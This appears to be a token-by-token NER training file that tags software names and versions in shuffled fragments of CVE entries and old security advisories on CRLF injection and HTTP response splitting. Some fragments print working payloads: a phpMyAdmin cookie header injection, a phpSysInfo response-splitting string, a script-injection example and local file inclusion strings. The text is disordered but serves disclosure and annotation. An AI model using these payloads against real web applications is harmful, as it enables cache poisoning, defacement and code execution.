attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
Joomla SN
before SV
1.0.13 SV
( O
aka O
Sunglow O
) O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
probably O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
url O
parameter O
. O

NOTE O
: O
this O
can O
be O
leveraged O
for O
cross-site O
scripting O
( O
XSS O
) O
attacks O
. O

CRLF O
injection O
vulnerability O
in O
the O
redirect O
feature O
in O
Sun SN
Java SN
System SN
Web SN
Server SN
6.1 SV
and SV
7.0 SV
before SV
20070802 SV
, O
when O
the O
redirect O
Server O
Application O
Function O
( O
SAF O
) O
uses O
the O
url-prefix O
parameter O
and O
escape O
is O
disabled O
, O
or O
an O
Error O
directive O
uses O
the O
url-prefix O
parameter O
in O
obj.conf O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
. O

CRLF O
injection O
vulnerability O
in O
www/delivery/ck.php O
in O
Openads SN
2.3 SV
( O
aka SN
Max SN
Media SN
Manager SN
, O
MMM SN
) O
before SV
0.3.31-alpha-pr3 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
destination O
parameter O
. O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
adclick.php O
in O
( O
a O
) O
Openads SN
( O
phpAdsNew SN
) O
2.0.11 SV
and SV
earlier SV
and O
( O
b O
) O
Openads O
for O
PostgreSQL SN
( O
phpPgAds SN
) O
2.0.11 SV
and SV
earlier SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
( O
1 O
) O
the O
dest O
parameter O
and O
( O
2 O
) O
the O
Referer O
HTTP O
header O
. O

CRLF O
injection O
vulnerability O
in O
phpMyVisites SN
before SV
2.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
url O
parameter O
, O
when O
the O
pagename O
parameter O
begins O
with O
FILE O
: O
. O

This O
software O
is O
a O
free O
and O
powerful O
open O
source O
( O
GNU/GPL O
) O
software O
for O
websites O
statistics O
and O
audience O
measurements O
: O
Impacted O
versions O
: O
Versions O
2.2 SV
stable SV
( O
released O
on O
November O
10 O
, O
2006 O
) O
and O
newer O
are O
not O
impacted O
by O
these O
vulnerabilities O
. O

So O
tmp/utf-8.php O
would O
be O
accepted O
. O

Multiple O
vulnerabilities O
in O
phpMyVisites O
Application O
: O
phpMyVisites SN
prior SV
to SV
2.2 SV
stable SV
Release O
Date O
: O
11 O
February O
2007 O
Author O
: O
Nicob O
< O
nicob O
at O
nicob.net O
Abstract O
: O
Several O
vulnerabilities O
were O
identified O
in O
phpMyVisites O
. O

So O
my O
brief O
code O
audit O
focused O
on O
this O
very O
file O
. O

Some O
vulnerabilities O
in O
these O
libraries O
were O
patched O
in O
version O
2.2 SV
stable O
too O
. O

Notes O
: O
- O
only O
one O
PHP O
file O
( O
phpmyvisites.php O
) O
need O
to O
be O
remotely O
accessed O
by O
visitors O
. O

A O
paranoid O
installation O
will O
allow O
remote O
access O
only O
to O
this O
file O
( O
for O
example O
via O
htaccess O
) O
. O

- O
external O
libraries O
( O
smarty O
, O
phpMailer O
, O
PEAR O
are O
embedded O
in O
any O
phpMyVisites O
install O
. O

Part O
of O
this O
cookie O
is O
used O
to O
construct O
a O
file O
path O
, O
which O
is O
then O
used O
in O
a O
require O
( O
) O
call O
: O
if O
( O
! O
isset O
( O
$ O
this- O
> O
file O
) O
|| O
! O
strpos O
( O
$ O
this- O
> O
file O
, O
utf-8.php O
strpos O
( O
$ O
this- O
> O
file O
this- O
> O
file O
= O
$ O
this- O
> O
getNearestLang O
( O
) O
; O
} O
require O
LANGS_PATH O
. O

$ O
this- O
> O
file O
; O
In O
this O
code O
, O
the O
third O
check O
is O
FALSE O
if O
the O
strpos O
( O
) O
call O
returns O
FALSE O
_or_ O
0 O
. O

Vulnerabilities O
: O
- O
HTTP O
Response O
Splitting O
via O
the O
url O
parameter O
( O
triggered O
when O
the O
pagename O
parameter O
begins O
by O
FILE O
Cross O
Site O
Scripting O
in O
function O
GetCurrentCompletePath O
( O
) O
: O
cation O
) O
< O
/script O
> O
B/CCC O
- O
Local O
file O
include O
via O
the O
pmv_ck_view O
cookie O
parameter O
. O

Multiple O
vulnerabilities O
in O
phpMyVisites O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
PhpMyAdmin SN
2.7.0-pl2 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
a O
phpMyAdmin O
cookie O
in O
( O
1 O
) O
css/phpmyadmin.css.php O
, O
( O
2 O
) O
db_create.php O
, O
( O
3 O
) O
index.php O
, O
( O
4 O
) O
left.php O
, O
( O
5 O
) O
libraries/session.inc.php O
, O
( O
6 O
) O
libraries/transformations/overview.php O
, O
( O
7 O
) O
querywindow.php O
, O
( O
8 O
) O
server_engines.php O
, O
and O
possibly O
other O
files O
. O

Tested O
: O
Just O
2.7.0-pl2 O
CRLF O
] O
] O
] O
Files O
/css/phpmyadmin.css.php O
/db_create.php O
/index.php O
/left.php O
/libraries/session.inc.php O
/libraries/transformations/overview.php O
/querywindow.php O
/server_engines.php O
Files O
Cookie O
: O
- O
> O
Open O
Cookie O
Editor O
- O
> O
Find O
the O
phpMyAdmin O
value O
- O
> O
Write O
it O
; O
phpMyAdmin= O
% O
0d O
% O
0aSet-Cookie O
% O
3Asome O
% O
3Dvalue O
New O
Cookie O
= O
some=value O
CRLF O
] O
] O
] O
[ O
[ O
PATH O
] O
] O
] O
File O
libraries/common.lib.php O
/File O
[ O
[ O
/PATH O
ajann O
, O
Turkey O
Im O
not O
Hacker O
! O

Title O
: O
PhpMyAdmin SN
2.7.0-pl2 SV
Path O
Disclosure O
| O
Multiple O
CRLF/Http O
Response O
Splitting O
Vulnerability O
Author O
: O
ajann O
Contact O

PhpMyAdmin SN
2.7.0-pl2 SV
Path O
Disclosure O
| O
Multiple O
CRLF/Http O
Response O
Splitting O

CRLF O
injection O
vulnerability O
in O
viewcvs O
in O
ViewCVS SN
0.9.2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
CRLF O
sequences O
in O
the O
content-type O
parameter O
. O

Of O
course O
, O
both O
of O
this O
could O
easily O
happen O
on O
web O
sites O
such O
as O
Sourceforge O
( O
who O
, O
however O
, O
introduced O
separate O
subdomains O
for O
user O
authentication O
and O
web O
based O
access O
to O
CVS O
) O
, O
or O
sites O
which O
use O
CVS O
in O
the O
way O
a O
version O
controlled O
wiki O
is O
used O
and O
allow O
public O
write O
access O
. O

However O
, O
all O
of O
the O
above O
requires O
that O
some O
admin O
messes O
around O
with O
CVS O
write O
access O
on O
the O
server O
ViewCVS O
grants O
read O
access O
to O
and O
gave O
access O
to O
someone O
with O
bad O
intentions O
or O
no O
clue O
. O

I O
suggest O
that O
Linux O
distributions O
should O
patch O
this O
issue O
short O
term O
and O
deprecate O
support O
for O
ViewCVS O
mid O
to O
long O
term O
. O

For O
an O
example O
, O
please O
compare O
what O
your O
web O
browser O
displays O
on O
these O
locations O
: O
p/test00.htm O
rev=1.9 O
& O
content-type=text/vnd.viewcvs-markup O
p/test00.htm O
rev=1.9 O
& O
content-type=text/html O
The O
two O
obviously O
look O
somewhat O
differently O
, O
and O
on O
the O
second O
location O
you O
can O
see O
( O
assuming O
you O
have O
Javascript O
activated O
globally O
) O
that O
a O
request O
is O
made O
to O
Google O
( O
from O
within O
the O
security O
context O
of O
cvs.sourceforge.jp O
) O
. O

Short O
version O
for O
the O
busy O
ones O
: O
o O
Security O
issue O
on O
ViewCVS O
0.9.4 O
o O
Not O
really O
exploitable O
unless O
malicious O
users O
have O
CVS O
write O
access O
AND O
victim O
visits O
pre-crafted O
URL O
ViewCVS O
0.9.4 O
is O
no O
longer O
under O
development O
, O
has O
been O
abandoned O
in O
favor O
of O
ViewVC O
( O
and O
should O
probably O
no O
longer O
be O
used O
in O
production O
environments O
. O

Explicitly O
limit O
your O
application O
to O
the O
functionality O
you O
want O
and O
need O
it O
to O
have O
. O

The O
0.9.4 SV
release O
on O
viewvc.tigris.org O
seems O
to O
be O
unpatched O
and O
it O
possible O
that O
some O
Linux O
distributions O
and O
whoever O
would O
normally O
care O
were O
never O
patched O
against O
this O
. O

The O
issue O
is O
one O
which O
can O
hardly O
be O
practially O
exploited O
( O
thus O
this O
short O
and O
boring O
advisory O
and O
no O
prior O
notice O
to O
the O
previous O
developers O
) O
. O

But O
XSS O
is O
just O
one O
possibility O
. O

More O
precisely O
, O
do O
not O
use O
user O
generated O
data O
provided O
in O
HTTP O
requests O
to O
specify O
content O
types O
of O
HTTP O
responses O
unless O
you O
are O
using O
a O
whitelisting O
approach O
. O

Moritz O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.6 O
( O
GNU/Linux O
) O
iD8DBQFF41Hln6GkvSd/BgwRAgWSAJ47KZFCVAdzLMURunMFZWrKz7AbFACdHxo7 O
LTzzddXx7obLmXGsot4d1ug= O
=T0XX O
END O
PGP O
SIGNATURE O
( O
1 O
replies O
) O

Unfortunately O
this O
script O
_is_ O
still O
widely O
used O
, O
so O
I O
think O
it O
still O
worth O
telling O
about O
this O
otherwise O
not O
really O
important O
finding O
. O

This O
means O
that O
ViewCVS O
and O
thus O
the O
domain O
it O
runs O
in O
is O
vulnerable O
to O
Cross O
Site O
Scripting O
, O
assuming O
that O
someone O
not O
fully O
trustable O
has O
write O
permissions O
on O
one O
of O
the O
CVS O
repositories O
ViewCVS O
grants O
access O
to O
here O
. O

The O
source O
of O
the O
problem O
is O
that O
ViewCVS O
allows O
users O
to O
specify O
the O
content O
type O
which O
the O
server O
generated O
HTTP O
response O
will O
be O
sent O
with O
. O

Thanks O
for O
reading O
, O
have O
a O
fine O
day O
. O

However O
, O
it O
is O
actually O
more O
than O
the O
response O
splitting O
issue O
. O

This O
was O
previously O
considered O
a O
HTTP O
response O
splitting O
vulnerability O
by O
Jose O
Antonio O
Coret O
( O
Joxean O
Koret O
) O
tml O
( O
BID O
12112 O
, O
couldn O
t O
find O
a O
CVE O
, O
AFAICT O
it O
is O
_not_ O
CAN-2004-1062 O
) O
and O
, O
according O
to O
him O
, O
a O
patch O
has O
been O
stored O
on O
the O
1.0-dev O
CVS O
branch O
. O

Web O
application O
developer O
lessons O
learnt O
( O
once O
again O
) O
: O
1 O
. O

This O
should O
also O
work O
for O
delivering O
VML O
exploits O
and O
other O
funny O
stuff O
, O
such O
as O
... O
when O
some O
victim O
uses O
a O
funny O
web O
browser O
( O
such O
as O
Internet O
Explorer O
5.5/6/7 O
) O
and O
some O
attacker O
stores O
files O
such O
as O
this O
in O
a O
CVS O
repository O
and O
makes O
the O
victim O
access O
it O
with O
with O
& O
content-type=image/jpeg O
appended O
to O
the O
ViewCVS O
URL O
. O

ViewCVS SN
0.9.4 SV
issues O

Multiple O
HTTP O
response O
splitting O
vulnerabilities O
in O
Hitachi SN
Business SN
Logic SN
- O
Container SN
( O
BLC SN
) O
P-2443-9114 SV
01-00 SV
through SV
02-06 SV
on O
Windows O
, O
and O
P-1M43-9111 SV
01-01 SV
through SV
02-00 SV
on O
AIX O
, O
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
via O
unknown O
attack O
vectors O
in O
an O
unspecified O
input O
form O
. O

CRLF O
injection O
vulnerability O
in O
Mantis SN
1.0.0rc3 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
modify O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
( O
1 O
) O
the O
return O
parameter O
in O
login_cookie_test.php O
and O
( O
2 O
) O
ref O
parameter O
in O
login_select_proj_page.php O
. O

CRLF O
injection O
vulnerability O
in O
phpMyAdmin SN
before SV
2.6.4-pl4 SV
allows O
remote O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
scripts O
. O

HTTP O
response O
splitting O
vulnerability O
in O
index.php O
in O
phpSysInfo SN
2.4 SV
and SV
earlier SV
, O
as O
used O
in O
phpgroupware SN
0.9.16 SV
and SV
earlier SV
, O
and O
egroupware SN
before SV
1.0.0.009 SV
, O
allows O
remote O
attackers O
to O
spoof O
web O
content O
and O
poison O
web O
caches O
via O
CRLF O
sequences O
in O
the O
charset O
parameter O
. O

This O
response O
is O
the O
only O
one O
that O
will O
be O
returned O
by O
any O
intermediate O
proxy O
, O
showing O
what- O
ever O
HTML O
the O
attacker O
injected O
previously O
. O

November O
2005 O
- O
Public O
disclosure O
. O

Vendor O
Status O
: O

References O
: O
e.pdf O
Plug O
: O
You O
can O
discuss O
this O
and O
other O
vulnerabilities O
in O
our O
forum O
at O
- O
an O
up-to-date O
list O
of O
advisories O
can O
be O
found O
at O
GPG-Key O
: O
pub O
1024D/0A864AA1 O
2004-04-17 O
Hardened-PHP O
Signature O
Key O
Key O
fingerprint O
= O
066F O
A6D0 O
E57E O
9936 O
9082 O
7E52 O
4439 O
14CC O
0A86 O
4AA1 O
Copyright O
2005 O
Christopher O
Kunz O
Hardened O
PHP O
Project O
. O

November O
2005 O
- O
2.4 O
does O
not O
seem O
to O
fix O
- O
own O
patch O
sent O
to O
vendor O
. O

November O
2005 O
- O
Bug O
disclosed O
to O
vendor O
. O

We O
also O
recommend O
installing O
the O
Hardening O
Patch O
for O
PHP O
which O
would O
have O
mitigated O
the O
response O
splitting O
problem O
( O
by O
not O
allowing O
multiline O
headers O
) O
and O
the O
$ O
_SERVER O
overwriting O
issues O
( O
by O
not O
allowing O
certain O
superglobals O
to O
be O
overwritten O
from O
the O
outside O
) O
. O

The O
other O
XSS O
holes O
mentioned O
in O
that O
ad- O
visory O
are O
still O
valid O
, O
too O
. O

In O
the O
Debian O
Sarge O
package O
, O
injecting O
only O
HTTP_ACCEPT_LANGUAGE O
is O
suffi- O
cient O
- O
the O
current O
source O
tree O
( O
phpsysinfo-dev O
from O
sf.net O
) O
requires O
the O
attacker O
to O
additionally O
inject O
the O
$ O
lng O
parameter O
. O

It O
is O
, O
however O
, O
not O
exploitable O
on O
Debian O
systems O
. O

In O
all O
other O
cases O
, O
it O
can O
be O
set O
via O
the O
URL O
. O

By O
breaking O
up O
the O
argument O
with O
, O
the O
attacker O
can O
inject O
a O
complete O
second O
HTTP O
response O
. O

November O
2005 O
- O
New O
updated O
version O
2.4.1 O
fixes O
the O
issues O
. O

All O
rights O
reserved O
. O

Vendor O
has O
released O
an O
updated O
version O
. O

Disclosure O
Timeline O
: O
10 O
. O

Details O
: O
It O
is O
important O
to O
note O
that O
due O
to O
the O
nature O
of O
phpSysInfo O
, O
it O
is O
unlikely O
to O
be O
run O
inside O
an O
open_basedir O
, O
since O
most O
of O
the O
information O
the O
software O
obtains O
is O
from O
the O
/proc O
or O
/etc O
directories O
. O

If O
they O
have O
a O
way O
to O
create O
content O
on O
the O
target O
server O
( O
such O
as O
an O
entry O
in O
syslog O
or O
the O
web O
server O
log O
file O
) O
, O
they O
can O
use O
this O
to O
execute O
arbitrary O
code O
. O

This O
variable O
is O
fed O
to O
a O
header O
( O
) O
call O
without O
any O
additional O
checks O
. O

We O
have O
provided O
a O
bugfix O
to O
the O
vendor O
, O
which O
, O
in O
addition O
to O
their O
own O
fix O
, O
will O
be O
included O
in O
version O
2.4.1 O
of O
phpSysInfo O
. O

Proof O
of O
Concept O
: O
The O
examples O
above O
should O
provide O
you O
with O
enough O
PoC O
to O
validate O
the O
ex- O
istance O
of O
the O
vulnerabilities O
. O

Credits O
: O
All O
vulnerabilities O
were O
investigated O
by O
the O
Hardened-PHP O
Project O
. O

They O
can O
be O
abused O
with O
register_globals O
Off O
, O
this O
is O
different O
from O
the O
advisory O
by O
ISS O
. O

BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.0.6 O
( O
GNU/Linux O
) O

a O
.htaccess O
file O
. O

It O
will O
displays O
things O
like O
Uptime O
, O
CPU O
, O
Memory O
, O
SCSI O
, O
IDE O
, O
PCI O
, O
Ethernet O
, O
Floppy O
, O
and O
Video O
Information O
. O

Using O
HTTP O
Response O
Splitting O
, O
arbitrary O
strings O
can O
be O
injected O
into O
the O
variable O
$ O
charset O
, O
which O
is O
meant O
to O
include O
a O
value O
such O
as O
iso-8859-1 O
or O
similar O
, O
but O
is O
only O
set O
to O
a O
value O
inside O
a O
language O
include O
file O
if O
a O
language O
in O
fact O
requires O
a O
character O
set O
different O
from O
iso-8859-1 O
. O

With O
this O
variable O
, O
arbitrary O
file O
inclusion O
is O
possible O
on O
some O
platforms O
, O
dependant O
on O
the O
local O
realpath O
( O
) O
implementation O
. O

Additionally O
, O
access O
to O
the O
includes O
directory O
should O
be O
restricted O
by O
appropriate O
means O
, O
e.g O
. O

An O
additional O
attack O
vector O
for O
Cross-Site O
Scripting O
attacks O
is O
the O
variable O
$ O
VERSION O
, O
which O
is O
used O
for O
the O
version O
string O
displayed O
on O
the O
bottom O
of O
each O
page O
. O

Credit O
to O
referred O
vulnerabilities O
goes O
to O
the O
original O
authors O
, O
as O
mentioned O
on O
CVE O
. O

Example O
: O
/index.php O
VERSION= O
% O
22 O
% O
3E O
% O
3Cscript O
% O
3Ealert O
( O
xss O
) O
% O
3C/script O
% O
3E O
A O
fairly O
unknown O
attack O
class O
is O
so-called O
HTTP O
Response O
Splitting O
, O
an O
at- O
tack O
that O
allows O
for O
selective O
defacement O
of O
web O
pages O
by O
poisoning O
for- O
warding O
or O
reverse O
proxies O
. O

The O
reason O
for O
this O
problem O
lies O
in O
the O
incorrect O
handling O
of O
variables O
by O
the O
globalization O
layer O
implemented O
in O
phpSysInfo O
index.php O
- O
quote O
: O
if O
( O
! O
empty O
( O
$ O
HTTP_GET_VARS O
) O
) O
while O
( O
list O
( O
$ O
name O
, O
$ O
value O
) O
= O
each O
( O
$ O
HTTP_GET_VARS O
) O
) O
$ O
$ O
name O
= O
$ O
value O
; O
if O
( O
! O
empty O
( O
$ O
HTTP_POST_VARS O
) O
) O
while O
( O
list O
( O
$ O
name O
, O
$ O
value O
) O
= O
each O
( O
$ O
HTTP_POST_VARS O
) O
) O
$ O
$ O
name O
= O
$ O
value O
; O
As O
the O
interested O
reader O
will O
easily O
see O
, O
this O
two-liner O
overwrites O
the O
complete O
scope O
, O
including O
the O
superglobal O
variable O
$ O
_SERVER O
. O

A O
number O
of O
holes O
- O
all O
of O
them O
attributed O
to O
a O
rather O
crude O
( O
and O
unneeded O
) O
register_globals O
emulation O
- O
allow O
for O
arbitrary O
file O
inclusion O
, O
amongst O
other O
things O
. O

Example O
: O
/index.php O
sensor_program=lmsensors.inc.php O
README O
% O
00 O
Additionally O
, O
$ O
sensor_program O
can O
still O
be O
used O
to O
inject O
active O
contents O
into O
the O
page O
, O
known O
as O
Cross-Site O
Scripting O
. O

Direct O
access O
will O
probably O
yield O
an O
empty O
page O
, O
since O
many O
browsers O
do O
not O
know O
how O
to O
handle O
more O
than O
one O
response O
to O
a O
HTTP O
request O
. O

CVE O
Information O
: O
The O
Common O
Vulnerabilities O
and O
Exposures O
project O
( O
cve.mitre.org O
) O
has O
assigned O
the O
name O
CVE-2005-3347 O
to O
the O
file O
inclusion O
issue O
and O
the O
name O
name O
CVE-2005-3348 O
to O
the O
HTTP O
response O
splitting O
problem O
. O

Example O
: O
/index.php O
_SERVER O
[ O
HTTP_ACCEPT_LANGUAGE O
README O
% O
00 O
/index.php O
_SERVER O
[ O
HTTP_ACCEPT_LANGUAGE O
README O
% O
00 O
& O
lng O
README O
% O
00 O
The O
variable O
$ O
sensor_program O
is O
set O
in O
config.php O
, O
but O
can O
be O
overwritten O
since O
config.php O
is O
actually O
included O
before O
reglobalization O
takes O
place O
. O

If O
you O
want O
to O
fix O
the O
issue O
yourself O
, O
just O
comment O
out O
the O
lines O
mentioned O
in O
an O
earlier O
paragraph O
of O
this O
advisory O
and O
selectively O
infer O
the O
variables O
$ O
_REQUEST O
[ O
lng O
] O
and O
$ O
_REQUEST O
[ O
template O
] O
from O
the O
outside O
. O

References O
: O
Overview O
: O
phpSysInfo O
is O
a O
PHP O
script O
that O
displays O
information O
about O
the O
host O
being O
accessed O
. O

November O
2005 O
- O
Updated O
version O
2.4 O
released O
. O

An O
explanation O
of O
this O
attack O
class O
is O
beyond O
the O
scope O
of O
this O
advisory O
, O
a O
whitepaper O
can O
be O
obtained O
at O
. O

if O
the O
victim O
accesses O
the O
phpSysInfo O
instance O
from O
be- O
hind O
a O
proxy O
. O

Example O
: O
/index.php O
charset= O
% O
0d O
% O
0aContent-Length O
: O
% O
200 O
% O
0d O
% O
0a O
% O
0d O
% O
0aHTTP/1.1 O
% O
20200 O
% O
2 O
0OK O
% O
0d O
% O
0aContent-Type O
: O
% O
20text/html O
% O
0d O
% O
0aContent-Length O
: O
% O
2019 O
% O
0d O
% O
0a O
% O
0d O
% O
0a O
< O
htm O
l O
> O
Ha O
cked O
! O
< O
/html O
This O
example O
will O
print O
out O
a O
simple O
( O
and O
invalid O
) O
HTML O
page O
containing O
only O
the O
string O
Hacked O
! O

Comment O
: O
For O
info O
see O
iD8DBQFDdyOFRDkUzAqGSqERAt9KAJ4uCXhrcapN/zxWDS6n7y8ezp6xsQCgw28i O
HSdHc4zKJ8aCj5gSC8Zxlj4= O
=XRw5 O
END O
PGP O
SIGNATURE O

BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
Hardened O
PHP O
Project O
-= O
Security O
Advisory O
=- O
Advisory O
: O
Multiple O
vulnerabilities O
in O
phpSysInfo O
Release O
Date O
: O
2005/11/13 O
Last O
Modified O
: O
2005/11/12 O
Author O
: O
Christopher O
Kunz O
< O
christopher.kunz O
( O
at O
) O
hardened-php O
( O
dot O
) O
net O
[ O
email O
concealed O
] O
Application O
: O
phpSysInfo O
2.4 O
and O
prior O
Severity O
: O
Cross-Site O
Scripting O
, O
HTTP O
Response O
Splitting O
, O
Arbitrary O
local O
file O
inclusion O
Risk O
: O
Medium O

In O
fact O
, O
the O
author O
requires O
that O
safe_mode O
be O
set O
to O
Off O
and O
no O
other O
restrictions O
be O
imposed O
on O
the O
PHP O
installation O
. O

A O
hole O
that O
was O
reported O
in O
CVE-2003-0536 O
and O
is O
reported O
as O
fixed O
in O
the O
phpSysInfo O
README O
still O
persists O
. O

Furthermore O
, O
few O
admin- O
istrators O
will O
restrict O
its O
access O
to O
PHP O
shell O
functions O
, O
since O
a O
such O
restriction O
would O
render O
the O
software O
unusable O
. O

By O
injecting O
a O
local O
path O
name O
into O
$ O
_SERVER O
[ O
HTTP_ACCEPT_LANGUAGE O
] O
, O
an O
attacker O
can O
now O
include O
arbitrary O
files O
. O

This O
issue O
was O
discussed O
in O
CVE-2005-0870 O
and O
still O
exists O
. O

Advisory O
22/2005 O
: O
Multiple O
vulnerabilities O
in O
phpSysInfo O

HTTP O
response O
splitting O
vulnerability O
in O
language_select.asp O
in O
ASP SN
Nuke SN
0.80 SV
allows O
remote O
attackers O
to O
spoof O
web O
content O
and O
poison O
web O
caches O
via O
CRLF O
( O
% O
0d O
% O
0a O
) O
sequences O
in O
the O
LangCode O
parameter O
. O

HTTP O
response O
splitting O
vulnerability O
in O
the O
@ O
SetHTTPHeader O
function O
in O
Lotus SN
Domino SN
6.5.x SV
before SV
6.5.4 SV
and SV
6.0.x SV
before SV
6.0.5 SV
allows O
attackers O
to O
poison O
the O
web O
cache O
via O
malicious O
applications O
. O

CRLF O
injection O
vulnerability O
in O
search.php O
in O
Phorum SN
5.0.14a SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
via O
the O
body O
parameter O
, O
which O
is O
included O
in O
the O
resulting O
Location O
header O
. O

Squid SN
2.5 SV
up SV
to SV
2.5.STABLE7 SV
allows O
remote O
attackers O
to O
poison O
the O
cache O
via O
an O
HTTP O
response O
splitting O
attack O
. O

CRLF O
injection O
vulnerability O
in O
calendar.php O
in O
DCP-Portal SN
5.3.2 SV
and SV
earlier SV
allows O
remote O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
to O
spoof O
web O
content O
and O
poison O
web O
caches O
via O
CRLF O
( O
% O
0d O
% O
0a O
) O
sequences O
in O
the O
PHPSESSID O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
PD9 SN
Software SN
MegaBBS SN
2 SV
and SV
2.1 SV
allows O
attackers O
to O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
fid O
parameter O
in O
a O
writenew O
action O
to O
thread-post.asp O
. O

CRLF O
injection O
vulnerability O
in O
down.asp O
for O
Snitz SN
Forums SN
2000 SV
3.4.04 SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
the O
location O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
Serendipity SN
before SV
0.7rc1 SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
the O
url O
parameter O
in O
( O
1 O
) O
index.php O
and O
( O
2 O
) O
exit.php O
, O
or O
( O
3 O
) O
the O
HTTP O
Referer O
field O
in O
comment.php O
. O

CRLF O
injection O
vulnerability O
in O
wp-login.php O
in O
WordPress SN
1.2 SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
the O
text O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
subscribe_thread.php O
in O
w-Agora SN
4.1.6a SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
the O
thread O
parameter O
. O

CRLF O
injection O
vulnerability O
in O
index.php O
in O
phpWebSite SN
0.9.3-4 SV
allows O
remote O
attackers O
to O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
via O
the O
block_username O
parameter O
in O
the O
user O
module O
. O

CRLF O
injection O
vulnerability O
in O
login.php O
in O
WebCalendar O
allows O
remote O
attackers O
to O
inject O
CRLF O
sequences O
via O
the O
return_path O
parameter O
and O
perform O
HTTP O
Response O
Splitting O
attacks O
to O
modify O
expected O
HTML O
content O
from O
the O
server O
. O
